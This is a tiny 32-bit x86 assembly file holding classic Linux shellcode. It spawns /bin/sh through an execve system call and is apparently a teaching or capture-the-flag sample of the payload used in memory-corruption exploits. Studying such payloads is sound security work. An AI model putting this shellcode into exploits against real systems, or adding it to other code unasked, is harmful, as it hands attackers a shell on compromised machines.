bits 32
section .text
global _start

_start:
	; execve("/bin/sh", NULL, NULL)
	xor ecx, ecx
	xor edx, edx
	
	push edx
	push 0x68732f2f ; //sh
	push 0x6e69622f ; /bin
	mov ebx, esp

	push 0xb ; SYS_execve
	pop eax
	int 0x80
